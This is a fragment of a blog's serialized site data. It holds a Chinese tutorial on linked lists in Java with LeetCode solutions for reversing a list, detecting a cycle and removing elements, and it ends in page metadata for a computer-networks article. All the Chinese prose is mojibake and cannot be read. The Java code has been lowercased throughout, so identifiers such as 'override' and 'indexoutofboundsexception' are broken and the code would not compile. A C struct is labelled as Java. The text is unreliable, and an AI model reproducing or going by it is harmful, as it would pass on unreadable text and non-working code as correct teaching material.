}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n\n\n\n# çº¿æ§è¡¨çé¾å¼è¡¨ç¤ºåå®ç°ï¼javaè¯­è¨çï¼\n\n\n# åé¾è¡¨çå®ä¹åè¡¨ç¤º\n\n> çº¿æ§è¡¨çé¾å¼å­å¨ç»æçç¹ç¹æ¯ï¼ä½¿ç¨ä¸ç»äººæçå­å¨ååå­å¨çº¿æ§è¡¨ä¸­çæ°æ®åç´ ï¼å¯ä»¥æ¯è¿ç»­çï¼ä¹å¯ä»¥æ¯ä¸è¿ç»­çã\n\nä¸ºäºè¡¨ç¤ºæ¯ä¸ªåç´ åå¶åç»§åç´ ä¹é´çå³ç³»ï¼é¤äºå­å¨æ°æ®æ¬èº«çä¿¡æ¯ä¹å¤ï¼è¿éè¦ä¸ä¸ªå­å¨åç»§åç´ ä½ç½®çåºåãæä»¬éå¸¸è®²ï¼æ°æ®ååæéåãæéåä¸­å­å¨çä¿¡æ¯ä¸ºæéæèé¾ãnä¸ªé¾ç»åæä¸ä¸ªé¾è¡¨ç§°ä¸ºçº¿æ§è¡¨ã(a1,a2,â¦â¦an)\n\n**æ ¹æ®é¾è¡¨çæéçä¸ªæ°ãæ¹åãè¿æ¥æ¹å¼ç­ï¼é¾è¡¨åå¯ä»¥åä¸ºï¼åé¾è¡¨ãå¾ªç¯é¾è¡¨ãååé¾è¡¨ãäºåé¾è¡¨ãåå­é¾è¡¨ãé»æ¥è¡¨ãé»æ¥å¤éè¡¨ç­ã**åé¾è¡¨ãå¾ªç¯é¾è¡¨åååé¾è¡¨ç¨äºå®ç°çº¿æ§è¡¨çé¾å¼å­å¨ç»æãå¶ä»å½¢å¼å¤ç¨äºå®ç°æ æèå¾ç­éçº¿æ§çç»æã\n\nå¨javaä¸­ï¼åé¾è¡¨çå­å¨ç»æå¯ä»¥å®ä¹ä¸ºï¼\n\ntypedef int elemtype;\n\ntypedef struct {\n  elemtype data;\n  struct lnode *next;\n}lnode, *linklist;\n\n\n1\n2\n3\n4\n5\n6\n\n\nä¸è¬æåµä¸ï¼å¾å¾å¨åé¾è¡¨çç¬¬ä¸ä¸ªèç¹ä¹åè®¾ç½®ä¸ä¸ªèç¹ï¼ç§°ä¸ºå¤´èç¹ãè¿éæä»¬åä¸è¦æ·»å å¤´ç»ç¹ã\n\n * å¤´èç¹æ¯å¨é¦åç»ç¹ä¹åéè®¾çä¸ä¸ªç»ç¹ï¼æéåæåé¦åç´ ç»ç¹ã\n * å¤´æéæ¯æåé¾è¡¨ä¸­ç¬¬ä¸ä¸ªç»ç¹çæéï¼è¥é¾è¡¨è®¾ç½®æå¤´ç»ç¹ï¼åå¤´æéæåå¤´ç»ç¹ã\n\nç»é¾è¡¨å¢å å¤´ç»ç¹çå¥½å¤ï¼\n\n * ä¾¿äºé¦åèç¹çå¤çã\n * ä¾¿äºç©ºè¡¨åéç©ºè¡¨çç»ä¸å¤çã\n\n\n# åé¾è¡¨çåºæ¬æä½çå®ç°\n\nåé¡ºåºè¡¨ç»ä¸æ¥å£ï¼\n\npackage com.pwddd;\n\npublic interface list<e> {\n\n  public static final int element_not_found = -1;\n\n  /**\n     * æ¸é¤ææåç´ \n     */\n  void clear();\n\n\n  /**\n     * åç´ çæ°é\n     *\n     * @return åç´ çæ°é\n     */\n  int size();\n\n  /**\n     * æ¯å¦ä¸ºç©º\n     *\n     * @return æ¯å¦ä¸ºç©º\n     */\n  boolean isempty();\n\n  /**\n     * æ¯å¦åå«æä¸ªåç´ \n     *\n     * @param element æå®åç´ \n     * @return æ¯å¦åå«\n     */\n  boolean contains(e element);\n\n  /**\n     * æ·»å åç´ å°å°¾é¨\n     *\n     * @param element æå®çåç´ \n     */\n  void add(e element);\n\n  /**\n     * è·åindexä½ç½®çåç´ \n     *\n     * @param index æå®çç´¢å¼ä½ç½®\n     * @return ç´¢å¼ä½ç½®çåç´ \n     */\n  e get(int index);\n\n  /**\n     * è®¾ç½®indexä½ç½®çåç´ \n     *\n     * @param index   æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     * @return åæ¥çåç´ Öµ\n     */\n  e set(int index, e element);\n\n  /**\n     * å¨indexä½ç½®æå¥ä¸ä¸ªåç´ \n     *\n     * @param index   æå®çç´¢å¼ä½ç½®\n     * @param element ç´¢å¼ä½ç½®åæ¥çåç´ \n     */\n  void add(int index, e element);\n\n\n  /**\n     * å é¤indexä½ç½®çåç´ \n     *\n     * @param index æå®ç´¢å¼ä½ç½®\n     * @return å é¤ä½ç½®ä¹åçåç´ \n     */\n  e remove(int index);\n\n  /**\n     * æ¥çåç´ çç´¢å¼\n     *\n     * @param element æå®æ¥æ¾çåç´ \n     * @return åç´ çç´¢å¼\n     */\n  int indexof(e element);\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\nå®ä¹æ½è±¡ç±»ï¼å°é¡ºåºè¡¨åé¾è¡¨å¬å±é¨åæ½ååºæ¥ï¼\n\npackage com.pwddd;\n\npublic abstract class abstractlist<e> implements list<e> {\n  protected int size;\n  /**\n     * åç´ çæ°é\n     *\n     * @return åç´ çæ°é\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * æ¯å¦ä¸ºç©º\n     *\n     * @return æ¯å¦ä¸ºç©º\n     */\n  public boolean isempty() {\n    return size == 0;\n  }\n\n  /**\n     * æ¯å¦åå«æä¸ªåç´ \n     *\n     * @param element æå®åç´ \n     * @return æ¯å¦åå«\n     */\n  public boolean contains(e element) {\n    return indexof(element) != element_not_found;\n  }\n\n  /**\n     * æ·»å åç´ å°å°¾é¨\n     *\n     * @param element æå®çåç´ \n     */\n  public void add(e element) {\n    add(size,element);\n  }\n\n  protected void checkindex(int index){\n    if (index < 0 || index >= size){\n      throw new indexoutofboundsexception("åç´ ç´¢å¼è¶ç--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n\n  protected void checkindexforadd(int index){\n    if (index < 0 || index > size){\n      throw new indexoutofboundsexception("åç´ ç´¢å¼è¶ç--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\nåé¾è¡¨çå®ç°ï¼\n\npackage com.pwddd.linkedlist;\n\nimport com.pwddd.abstractlist;\n\npublic class linkedlist<e> extends abstractlist<e> {\n\n  private node<e> first;\n\n  @override\n  public void clear() {\n    size = 0;\n    first = null;\n  }\n\n  @override\n  public e get(int index) {\n    return node(index).element;\n  }\n\n  @override\n  public e set(int index, e element) {\n    node<e> node = node(index);\n    e old = node.element;\n    node.element = element;\n    return old;\n  }\n\n  @override\n  public void add(int index, e element) {\n    if (index == 0){\n      first = new node<e>(element,first);\n    }else {\n      node<e> prenode = node(index - 1);\n      prenode.next = new node<>(element,prenode.next);\n    }\n    size ++;\n  }\n\n  @override\n  public e remove(int index) {\n    checkindex(index);\n    node<e> node = first;\n    if (index == 0){\n      first = first.next;\n    }else {\n      node<e> prev = node(index - 1);\n      node = prev.next;\n      prev.next = node.next;\n    }\n    size--;\n    return node.element;\n  }\n\n  @override\n  public int indexof(e element) {\n    if (element == null){\n      node<e> node = first;\n      for (int i = 0; i < size; i++) {\n        if (node.element == null) return i;\n        node = node.next;\n      }\n    }else {\n      node<e> node = first;\n      for (int i = 0; i < size; i++) {\n        if (element.equals(node.element)){\n          return i;\n        }\n        node = node.next;\n      }\n    }\n    return element_not_found;\n  }\n\n\n  private node<e> node(int index){\n    checkindex(index);\n    node<e> node = first;\n    for (int i = 0; i < index; i++) {\n      node = node.next;\n    }\n    return node;\n  }\n\n\n  private static class node<e> {\n    e element;\n    node<e> next;\n\n    public node(e element, node<e> next) {\n      this.element = element;\n      this.next = next;\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\n\n# leetcode-åè½¬é¾è¡¨\n\nç»ä½ åé¾è¡¨çå¤´èç¹ head ï¼è¯·ä½ åè½¬é¾è¡¨ï¼å¹¶è¿ååè½¬åçé¾è¡¨ã\n\nç¤ºä¾ 1ï¼\n\n\n\nè¾å¥ï¼head = [1,2,3,4,5]\nè¾åºï¼[5,4,3,2,1]\n\n\n1\n2\n\n\nç¤ºä¾ 2ï¼\n\n\n\nè¾å¥ï¼head = [1,2]\nè¾åºï¼[2,1]\n\n\n1\n2\n\n\nç¤ºä¾ 3ï¼\n\nè¾å¥ï¼head = []\nè¾åºï¼[]\n\n\n1\n2\n\n\næç¤ºï¼\n\n * é¾è¡¨ä¸­èç¹çæ°ç®èå´æ¯ [0, 5000]\n * -5000 <= node.val <= 5000é¾è¡¨\n\n# éå½æ¹å¼\n\næè·¯ï¼\n\nè¾¹çæ¡ä»¶ï¼å½ä¼ å¥çheadä¸ºç©ºï¼è¯´æä¼ å¥çæ¯ä¸ä¸ªç©ºè¡¨ï¼æèä¼ å¥çheadçä¸ä¸ä¸ªç»ç¹ä¸ºç©ºï¼è¯´æä¼ å¥çæ¯ä¸ä¸ªåç»ç¹ãä»¥ä¸ä¸¤ç§æåµç´æ¥è¿åï¼æ²¡æå¿è¦åè½¬ã\n\néå½çæ³æ³å°±æ¯è°ç¨èªå·±å®æåè½¬ï¼åè®¾æä»¬è¿ä¸ªæ¹æ³reverselistè½å¤å®ç°åè½¬äºï¼é£ä¹å½æä»¬ä¼ å¥ä¸ä¸ªé¾è¡¨çheadçæ¶åï¼å°±å¯ä»¥å°è¯¥é¾è¡¨åè½¬ï¼é£ä¹å½æä»¬ä¼ å¥headçä¸ä¸ä¸ªçæ¶åï¼æå³çä»headçä¸ä¸ä¸ªç»ç¹å¼å§ï¼å·²ç»å®æäºåè½¬äºãå¦å¾æç¤ºï¼\n\n\n\næä»¬åªéè¦å°å¤´ç»ç¹çä¸ä¸ä¸ªç»ç¹çä¸ä¸ä¸ªç»ç¹æåå¤´ç»ç¹ï¼å¹¶ä¸å°å¤´ç»ç¹çä¸ä¸ä¸ªç»ç¹æåç©ºå³å¯ã\n\npublic listnode reverselist(listnode head) {\n  if (head == null || head.next == null) return head;\n  listnode newhead = reverselist(head.next);\n  head.next.next = head;\n  head.next = null;\n  return newhead;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# è¿­ä»£æ¹å¼\n\nè¿­ä»£æ¹å¼å°±ç¸å¯¹æ¥è®²ç®åä¸äºï¼ä½¿ç¨åæéçåæ³ãå¦ä¸ä»£ç æç¤ºï¼\n\nclass solution {\n  public listnode reverselist(listnode head) {\n    if (head == null || head.next == null) return head;\n    listnode newhead = null;\n    while (head!= null){\n      listnode tmp = head.next;\n      head.next = newhead;\n      newhead = head;\n      head = tmp;\n    }\n    return newhead;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\né¦åå®ä¹ä¸ä¸ªä¸´æ¶æéï¼æåheadçä¸ä¸ä¸ªç»ç¹ï¼é²æ­¢headçä¸ä¸ä¸ªç»ç¹éæ°èµå¼åä¸¢å¤±ãç¶åå°headçä¸ä¸ä¸ªç»ç¹æånewheadï¼å°newheadæåheadï¼ç¶åå°headæåtmpãå¦å¾æç¤ºï¼\n\n\n\n\n# leetcode - å¤æ­é¾è¡¨æ¯å¦æç¯\n\nç»ä½ ä¸ä¸ªé¾è¡¨çå¤´èç¹ head ï¼å¤æ­é¾è¡¨ä¸­æ¯å¦æç¯ã\n\nå¦æé¾è¡¨ä¸­ææä¸ªèç¹ï¼å¯ä»¥éè¿è¿ç»­è·è¸ª next æéåæ¬¡å°è¾¾ï¼åé¾è¡¨ä¸­å­å¨ç¯ã ä¸ºäºè¡¨ç¤ºç»å®é¾è¡¨ä¸­çç¯ï¼è¯æµç³»ç»åé¨ä½¿ç¨æ´æ° pos æ¥è¡¨ç¤ºé¾è¡¨å°¾è¿æ¥å°é¾è¡¨ä¸­çä½ç½®ï¼ç´¢å¼ä» 0 å¼å§ï¼ãæ³¨æï¼pos ä¸ä½ä¸ºåæ°è¿è¡ä¼ é ãä»ä»æ¯ä¸ºäºæ è¯é¾è¡¨çå®éæåµã\n\nå¦æé¾è¡¨ä¸­å­å¨ç¯ ï¼åè¿å true ã å¦åï¼è¿å false ã\n\nç¤ºä¾ 1ï¼\n\n\n\nè¾å¥ï¼head = [3,2,0,-4], pos = 1\nè¾åºï¼true\nè§£éï¼é¾è¡¨ä¸­æä¸ä¸ªç¯ï¼å¶å°¾é¨è¿æ¥å°ç¬¬äºä¸ªèç¹ã\n\n\n1\n2\n3\n\n\nç¤ºä¾ 2ï¼\n\n\n\nè¾å¥ï¼head = [1,2], pos = 0\nè¾åºï¼true\nè§£éï¼é¾è¡¨ä¸­æä¸ä¸ªç¯ï¼å¶å°¾é¨è¿æ¥å°ç¬¬ä¸ä¸ªèç¹ã\n\n\n1\n2\n3\n\n\nç¤ºä¾ 3ï¼\n\n\n\nè¾å¥ï¼head = [1], pos = -1\nè¾åºï¼false\nè§£éï¼é¾è¡¨ä¸­æ²¡æç¯ã\n\n\n1\n2\n3\n\n\næç¤ºï¼\n\n * é¾è¡¨ä¸­èç¹çæ°ç®èå´æ¯ [0, 104]\n * -105 <= node.val <= 105\n * pos ä¸º -1 æèé¾è¡¨ä¸­çä¸ä¸ª ææç´¢å¼ ã\n\nå¯ä»¥ä½¿ç¨å¿«æ¢æéçæ¹å¼ï¼å°±åå¨æåºè·æ­¥ï¼å¿«çä¸å®ä¼åæ¢çæéå ï¼æ²¡æéå å°±è¯´æä¸æ¯ç¯å½¢çã\n\npublic boolean hascycle(listnode head) {\n  if (head == null || head.next == null) return false;\n  listnode fast = head.next;\n  listnode slow = head;\n  while (fast != null && fast.next != null){\n    if (fast ==slow ){\n      return true;\n    }\n    fast = fast.next.next;\n    slow = slow.next;\n  }\n  return false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# leetcode-ç§»é¤é¾è¡¨çåç´ \n\nç»ä½ ä¸ä¸ªé¾è¡¨çå¤´èç¹ head åä¸ä¸ªæ´æ° val ï¼è¯·ä½ å é¤é¾è¡¨ä¸­æææ»¡è¶³ node.val == val çèç¹ï¼å¹¶è¿å æ°çå¤´èç¹ ã\n\nç¤ºä¾ 1ï¼\n\n\n\nè¾å¥ï¼head = [1,2,6,3,4,5,6], val = 6\nè¾åºï¼[1,2,3,4,5]\n\n\n1\n2\n\n\nç¤ºä¾ 2ï¼\n\nè¾å¥ï¼head = [], val = 1\nè¾åºï¼[]\n\n\n1\n2\n\n\nç¤ºä¾ 3ï¼\n\nè¾å¥ï¼head = [7,7,7,7], val = 7\nè¾åºï¼[]\n\n\n1\n2\n\n\næç¤ºï¼\n\n * åè¡¨ä¸­çèç¹æ°ç®å¨èå´ [0, 104] å\n * 1 <= node.val <= 50\n * 0 <= val <= 50\n\n# éå½\n\n\n\npublic listnode removeelements(listnode head, int val) {\n  if (head == null) return head;\n\n  head.next = removeelements(head.next, val);\n\n  return head.val == val ? head.next : head;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# è¿­ä»£\n\nä½¿ç¨åæéçæ¹å¼è¿è¡æä½ã\n\n\n\npublic listnode removeelements(listnode head, int val) {\n  if (head == null) return head;\n  listnode node = new listnode(1);\n  node.next = head;\n  listnode tmp = node;\n  while (tmp.next != null){\n    if (tmp.next.val == val){\n      tmp.next = tmp.next.next;\n    }else {\n      tmp = tmp.next;\n    }\n  }\n  return node.next;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:59:11",lastUpdatedTimestamp:1651852751e3},{title:"ãè®¡ç®æºç½ç»ãæ¦è¿°",frontmatter:{title:"ãè®¡ç®æºç½ç»ãæ¦è¿°",date:"2022-05-05T23:00:00.000Z",permalink:"/dev/basic/network/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","è®¡ç®æºåºç¡","è®¡ç®æºç½ç»"],tags:["è®¡ç®æºç½ç»"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/102.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/1021.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/00.%E6%A6%82%E8%BF%B0.html",relativePath:"01.å¼å/102.è®¡ç®æºåºç¡/1021.è®¡ç®æºç½ç»/00.æ¦è¿°.md",key:"v-31806689",path:"/dev/basic/network/introduction/",headers:[{level:2,title:"è®¡ç®æºç½ç»å¨ä¿¡æ¯æ¶ä»£çä½ç¨",slug:"è®¡ç®æºç½ç»å¨ä¿¡æ¯æ¶ä»£çä½ç¨",normalizedTitle:"è®¡ç®æºç½ç»å¨ä¿¡æ¯æ¶ä»£çä½ç¨",charIndex:42},{level:2,title:"äºèç½æ¦è¿°",slug:"äºèç½æ¦è¿°",normalizedTitle:"äºèç½æ¦è¿°",charIndex:196},{level:3,title:"ç½ç»çç½ç»",slug:"ç½ç»çç½ç»",normalizedTitle:"ç½ç»çç½ç»",charIndex:206},{level:3,title:"ç½ç»çåå±é¶æ®µ",slug:"ç½ç»çåå±é¶æ®µ",normalizedTitle:"ç½ç»çåå±é¶æ®µ",charIndex:350},{level:3,title:"äºèç½çæ ååå·¥ä½",slug:"äºèç½çæ ååå·¥ä½",normalizedTitle:"äºèç½çæ ååå·¥ä½",charIndex:522},{level:2,title:"äºèç½çç»æ",slug:"äºèç½çç»æ",normalizedTitle:"äºèç½çç»æ",charIndex:654},{level:3,title:"äºèç½çè¾¹ç¼é¨å",slug:"äºèç½çè¾¹ç¼é¨å",normalizedTitle:"äºèç½çè¾¹ç¼é¨å",charIndex:768},{level:3,title:"äºèç½çæ ¸å¿é¨å",slug:"äºèç½çæ ¸å¿é¨å",normalizedTitle:"äºèç½çæ ¸å¿é¨å",charIndex:956},{level:3,title:"çµè·¯äº¤æ¢",slug:"çµè·¯äº¤æ¢",normalizedTitle:"çµè·¯äº¤æ¢",charIndex:1032},{level:3,title:"åç»äº¤æ¢",slug:"åç»äº¤æ¢",normalizedTitle:"åç»äº¤æ¢",charIndex:393},{level:3,title:"æ¥æäº¤æ¢",slug:"æ¥æäº¤æ¢",normalizedTitle:"æ¥æäº¤æ¢",charIndex:1113},{level:2,title:"è®¡ç®æºç½ç»å¨æå½çåå±",slug:"è®¡ç®æºç½ç»å¨æå½çåå±",normalizedTitle:"è®¡ç®æºç½ç»å¨æå½çåå±",charIndex:1163},{level:2,title:"è®¡ç®æºç½ç»çç±»å«",slug:"è®¡ç®æºç½ç»çç±»å«",normalizedTitle:"è®¡ç®æºç½ç»çç±»å«",charIndex:1223},{level:3,title:"è®¡ç®æºç½ç»çå®ä¹",slug:"è®¡ç®æºç½ç»çå®ä¹",normalizedTitle:"è®¡ç®æºç½ç»çå®ä¹",charIndex:1236},{level:3,title:"è®¡ç®æºç½ç»çåç±»",slug:"è®¡ç®æºç½ç»çåç±»",normalizedTitle:"è®¡ç®æºç½ç»çåç±»",charIndex:1319},{level:2,title:"è®¡ç®æºç½ç»çæ§è½",slug:"è®¡ç®æºç½ç»çæ§è½",normalizedTitle:"è®¡ç®æºç½ç»çæ§è½",charIndex:1579},{level:3,title:"éæ§è½ææ ",slug:"éæ§è½ææ ",normalizedTitle:"éæ§è½ææ ",charIndex:2296},{level:2,title:"è®¡ç®æºç½ç»ä½ç³»ç»æ",slug:"è®¡ç®æºç½ç»ä½ç³»ç»æ",normalizedTitle:"è®¡ç®æºç½ç»ä½ç³»ç»æ",charIndex:2363},{level:3,title:"åè®®åååå±æ¬¡",slug:"åè®®åååå±æ¬¡",normalizedTitle:"åè®®åååå±æ¬¡",charIndex:2399},{level:3,title:"äºå±ä½ç³»ç»æ",slug:"äºå±ä½ç³»ç»æ",normalizedTitle:"äºå±ä½ç³»ç»æ",charIndex:2630},{level:3,title:"TCP/IPä½ç³»ç»æ",slug:"tcp-ipä½ç³»ç»æ",normalizedTitle:"tcp/ipä½ç³»ç»æ",charIndex:3e3}],excerpt:'<h1 id="ãè®¡ç®æºç½ç»ãæ¦è¿°"><a class="header-anchor" href="#ãè®¡ç®æºç½ç»ãæ¦è¿°">#</a> ãè®¡ç®æºç½ç»ãæ¦è¿°</h1>\n<blockquote>\n<p>åèä¹¦ï¼è®¡ç®æºç½ç»ï¼ç¬¬ä¸çï¼è°¢å¸ä»åçç¼èã</p>\n</blockquote>\n',headersStr:"è®¡ç®æºç½ç»å¨ä¿¡æ¯æ¶ä»£çä½ç¨ äºèç½æ¦è¿° ç½ç»çç½ç» ç½ç»çåå±é¶æ®µ äºèç½çæ ååå·¥ä½ äºèç½çç»æ äºèç½çè¾¹ç¼é¨å äºèç½çæ ¸å¿é¨å çµè·¯äº¤æ¢ åç»äº¤æ¢ æ¥æäº¤æ¢ è®¡ç®æºç½ç»å¨æå½çåå± è®¡ç®æºç½ç»çç±»å« è®¡ç®æºç½ç»çå®ä¹ è®¡ç®æºç½ç»çåç±» è®¡ç®æºç½ç»çæ§è½ éæ§è½ææ  è®¡ç®æºç½ç»ä½ç³»ç»æ åè®®åååå±æ¬¡ äºå±ä½ç³»ç»æ TCP/IPä½ç³»ç»æ",content:"# ãè®¡ç®æºç½ç»ãæ¦è¿°\n\n> åèä¹¦ï¼è®¡ç®æºç½ç»ï¼ç¬¬ä¸çï¼è°¢å¸ä»åçç¼èã\n\n\n# è®¡ç®æºç½ç»å¨ä¿¡æ¯æ¶ä»£çä½ç¨\n\n> 21ä¸çºªçéè¦ç¹å¾ï¼æ°å­åãç½ç»åãä¿¡æ¯åãæ¯ä¸ä¸ªä»¥ç½ç»ä¸ºæ ¸å¿çæ¶ä»£ã\n\nä¸å¤§ç½ç»ï¼çµä¿¡ç½ç»ãæçº¿çµè§ç½ç»ãè®¡ç®æºç½ç»\n\näºèç½çä¸¤ä¸ªéè¦çåºæ¬ç¹ç¹ï¼\n\n * è¿éæ§ï¼ä¸ç®¡è·ç¦»å¤è¿é½å¥½åç´æ¥å½¼æ­¤ç¸è¿ä¸æ ·\n * å±äº«ï¼èµæºå±äº«ï¼æå¡å¨ä¸çèµæºå¥½åå¨ç¨æ·èº«è¾¹ä¸æ ·æ¹ä¾¿ã\n\n\n# äºèç½æ¦è¿°\n\n\n# ç½ç»çç½ç»\n\n> è®¡ç®æºç½ç»ï¼ç±è¥å¹²èç¹åè¿æ¥èç¹çé¾è·¯ç»æãèç¹å¯ä»¥æ¯è®¡ç®æºãéçº¿å¨ãäº¤æ¢æºç­ã\n\nç½ç»ä¹é´éè¿è·¯ç±å¨è¿æ¥ï¼å½¢æäºä¸ä¸ªè¦çèå´æ´å¤§çç½ç»ï¼ç§°ä¸º ç½ç»çç½ç»ï¼ä¹å°±æ¯æä»¬å¸¸è¯´çäºè¿ç½ã\n\nç½ç»å°±æ¯æè®¸å¤è®¡ç®æºè¿æ¥å¨ä¸èµ·ï¼èäºè¿ç½åæ¯æè®¸å¤ç½ç»éè¿è·¯ç±å¨è¿æ¥å¨ä¸èµ·ã\n\n\n# ç½ç»çåå±é¶æ®µ\n\n * åä¸ªç½ç»ARPANETé¡¹äºèç½çåå±è¿ç¨\n   \n   ç¬¬ä¸ä¸ªåç»äº¤æ¢ç½ç»ï¼ARPANET ï¼ç¾å½å½é²é¨åå»ºï¼\n   \n   1983å¹´TCP/IPåè®®ç§°ä¸ºARPANETçæ ååè®®\n\n * å»ºæä¸çº§ç»æçäºèç½\n   \n   ä¸çº§ç½ç»åä¸ºï¼ä¸»å¹²ç½ãå°åºç½ãæ ¡å­ç½ï¼ä¼ä¸ç½ï¼\n\n * å¤å±æ¬¡ISPç»æçäºèç½\n\n\n\n\n# äºèç½çæ ååå·¥ä½\n\näºèç½æ ååç»ç»ï¼äºèç½åä¼ï¼ISOCï¼\n\n * äºèç½ä½ç³»ç»æå§åä¼ï¼IABï¼\n   * äºèç½å·¥ç¨é¨ï¼IETFï¼\n   * äºèç½ç ç©¶é¨ï¼IRTFï¼\n\næå®äºèç½æ åçä¸é¶æ®µ\n\n * äºèç½èæ¡\n * å»ºè®®æ å\n * äºèç½æ å\n\n\n# äºèç½çç»æ\n\n> ä»å·¥ä½æ¹å¼ä¸ï¼äºèç½å¯ä»¥ååä¸ºä¸¤ä¸ªé¨åï¼è¾¹ç¼é¨ååæ ¸å¿é¨åã\n\nè¾¹ç¼é¨åï¼ç¨æ·ç´æ¥ä½¿ç¨çï¼ææè¿æ¥å¨äºèç½ä¸çä¸»æºã\n\næ ¸å¿é¨åï¼ä¸ºè¾¹ç¼é¨åæä¾æå¡ï¼ç±å¤§éçç½ç»åè¿æ¥å¨è¿äºç½ç»ä¸çè·¯ç±å¨ç»æã\n\n\n\n\n# äºèç½çè¾¹ç¼é¨å\n\näºèç½çè¾¹ç¼é¨åæ¯è¿æ¥å¨äºèç½ä¸çææä¸»æºï¼ç§°ä¸º ç«¯ç³»ç»ã\n\næä»¬å¸¸è¯´çä¸»æºAåä¸»æºBéä¿¡ï¼å®éä¸æ¯ä¸»æºAä¸çæä¸ªç¨åºåä¸»æºBä¸çæä¸ä¸ªç¨åºè¿è¡éä¿¡ãç®ç§°ä¸ºè®¡ç®æºä¹é´çéä¿¡ã\n\nå¨ç½ç»çè¾¹ç¼é¨åç«¯ç³»ç»çéä¿¡å¯ä»¥åä¸ºä¸¤å¤§ç±»ï¼\n\n * CSæ¹å¼\n   \n   å®¢æ·ç«¯æ¯æå¡è¯·æ±æ¹ï¼æå¡å¨æ¯æå¡æä¾æ¹\n   \n   \n\n * P2Pæ¹å¼\n   \n   \n\n\n# äºèç½çæ ¸å¿é¨å\n\nå¨æ ¸å¿é¨åèµ·å°éè¦ä½ç¨çæ¯ è·¯ç±å¨ãè·¯ç±å¨æ¯ä¸ç§ç¹æ®çè®¡ç®æºï¼è·¯ç±å¨æ¯å®ç° åç»äº¤æ¢çå³é®æä»¶ï¼ä»»å¡æ¯ è½¬åå°å¶ä»çåç»ã\n\n\n# çµè·¯äº¤æ¢\n\næ´ä¸ªæ¥æçæ¯ç¹æµä»èµ·ç¹å°ç»ç¹ï¼å¥½åå¨ä¸ä¸ªç®¡éä¸­ä¼ éã\n\n\n# åç»äº¤æ¢\n\nåä¸ªåç»ä¼ å°ç¸é»çèç¹ï¼å­å¨ä¸æ¥ï¼ç¶åæ¥è½¬åè¡¨ï¼è½¬åå°ä¸ä¸ä¸ªèç¹ã\n\n\n# æ¥æäº¤æ¢\n\næ´ä¸ªæ¥æåä¼ éå°ç¸é»çèç¹ï¼å¨é¨å­å¨ä¸æ¥ï¼åæ¥è¯¢è½¬åè¡¨ï¼è½¬åå°ä¸ä¸ä¸ªèç¹ã\n\n\n\n\n# è®¡ç®æºç½ç»å¨æå½çåå±\n\n> ææ©å»ºç«å¹¿åç½çæ¯ééé¨ã1994å¹´4æ20æ¥æå½ç¨64kbpsä¸çº¿æ¥å¥äºèç½ã\n\n\n# è®¡ç®æºç½ç»çç±»å«\n\n\n# è®¡ç®æºç½ç»çå®ä¹\n\nè®¡ç®æºç½ç»å¹¶æ²¡æä¸¥æ 